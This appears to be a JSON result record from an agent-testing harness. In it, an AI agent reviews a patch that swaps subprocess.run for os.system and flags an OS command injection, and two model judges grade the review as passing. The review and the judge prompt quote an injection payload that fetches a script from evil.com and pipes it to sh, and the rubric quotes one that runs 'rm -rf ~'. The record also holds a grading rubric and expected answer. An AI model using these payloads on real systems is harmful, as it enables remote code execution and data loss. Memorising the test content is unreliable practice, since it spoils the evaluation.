@@ -1,0 +1,53 @@
+{
+  "caseId": "obfuscated-cmdi",
+  "rep": 0,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-obfuscated-cmdi.patch"
+  ],
+  "output": "## Findings\n\n**Critical: OS command injection (src/media/thumbnail.py:14)**\nThe diff replaces `subprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)` with `os.system(\" \".join(parts))`. The original list-argument form never invokes a shell, so shell metacharacters in the arguments are inert. `os.system` always runs the string through `/bin/sh -c`, and `infile`/`size` come straight from `request.GET` with no sanitization. An attacker can inject via either parameter, e.g.:\n\n```\n?src=input.png;curl+evil.com/x.sh|sh&size=100x100\n```\n\nThe shell will interpret `;`, `|`, backticks, `$()`, etc., giving arbitrary command execution on the server.\n\n**Misleading detail: unused `shlex` import (line 6)**\n`shlex` is imported but never called (no `shlex.quote`/`shlex.join`). It makes the diff look like proper escaping was added, but the join is a plain `\" \".join(parts)` with zero quoting — a reviewer skimming the import list could easily be fooled into thinking this is safe.\n\n**Fix:** revert to `subprocess.run([...], check=True)` with the argument list (no shell), or if a shell string is truly required, build it with `shlex.quote()` on each user-controlled value.",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-19T00:29:18.511Z",
+  "durationMs": 41280,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the core vulnerability — that user-controlled `size`/`src` from `request.GET` reach `os.system(\" \".join(parts))`, which invokes a shell and allows injection of shell metacharacters (e.g., `;`, `|`), contrasting this with the prior safe `subprocess.run([...])` argument-vector form, and gave a concrete exploit example and correct fix. This matches the rubric's required finding exactly, and it also correctly flagged the unused `shlex` import as a red herring rather than mistaking it for real sanitization.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the core vulnerability — that user-controlled `size`/`src` from `request.GET` reach `os.system(\" \".join(parts))`, which invokes a shell and allows injection of shell metacharacters (e.g., `;`, `|`), contrasting this with the prior safe `subprocess.run([...])` argument-vector form, and gave a concrete exploit example and correct fix. This matches the rubric's required finding exactly, and it also correctly flagged the unused `shlex` import as a red herring rather than mistaking it for real sanitization."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the core vulnerability: user-controlled input from request.GET flowing into os.system() via a joined string rather than the previous safe subprocess.run() argument-vector form, explained why this enables shell metacharacter injection, gave a concrete exploit example, and even flagged the unused shlex import as a red herring rather than mistaking it for real sanitization. This matches the rubric's PASS criteria exactly.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the core vulnerability: user-controlled input from request.GET flowing into os.system() via a joined string rather than the previous safe subprocess.run() argument-vector form, explained why this enables shell metacharacter injection, gave a concrete exploit example, and even flagged the unused shlex import as a red herring rather than mistaking it for real sanitization. This matches the rubric's PASS criteria exactly."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe diff introduces an OS command injection vulnerability: user-controlled `size`/`src` from request.GET are collected into a `parts` list that is then joined into a single shell string with `' '.join(parts)` and passed to `os.system(...)`, allowing arbitrary shell command execution (e.g. size='100x100; rm -rf ~'). The previous code used a safe `subprocess.run([...])` argument vector. PASS only if the review identifies this as a real command/shell injection vulnerability caused by user input reaching `os.system`; FAIL if it misses it, concludes the code is safe (e.g. mistakes `parts` for a safe argument vector), or only comments on style or the unused `shlex` import.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\n## Findings\n\n**Critical: OS command injection (src/media/thumbnail.py:14)**\nThe diff replaces `subprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)` with `os.system(\" \".join(parts))`. The original list-argument form never invokes a shell, so shell metacharacters in the arguments are inert. `os.system` always runs the string through `/bin/sh -c`, and `infile`/`size` come straight from `request.GET` with no sanitization. An attacker can inject via either parameter, e.g.:\n\n```\n?src=input.png;curl+evil.com/x.sh|sh&size=100x100\n```\n\nThe shell will interpret `;`, `|`, backticks, `$()`, etc., giving arbitrary command execution on the server.\n\n**Misleading detail: unused `shlex` import (line 6)**\n`shlex` is imported but never called (no `shlex.quote`/`shlex.join`). It makes the diff look like proper escaping was added, but the join is a plain `\" \".join(parts)` with zero quoting — a reviewer skimming the import list could easily be fooled into thinking this is safe.\n\n**Fix:** revert to `subprocess.run([...], check=True)` with the argument list (no shell), or if a shell string is truly required, build it with `shlex.quote()` on each user-controlled value.\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "transcript": {
+    "command": "claude",
+    "args": [
+      "-p",
+      "Review this diff for security issues and report your findings. Read the file 'diff-obfuscated-cmdi.patch' in your current working directory, then review it.",
+      "--allowedTools",
+      "Read Grep Glob",
+      "--strict-mcp-config",
+      "--model",
+      "claude-sonnet-5"
+    ],
+    "exitCode": 0,
+    "timedOut": false,
+    "stderr": "Warning: no stdin data received in 3s, proceeding without it. If piping from a slow command, redirect stdin explicitly: < /dev/null to skip, or wait longer."
+  }
+}
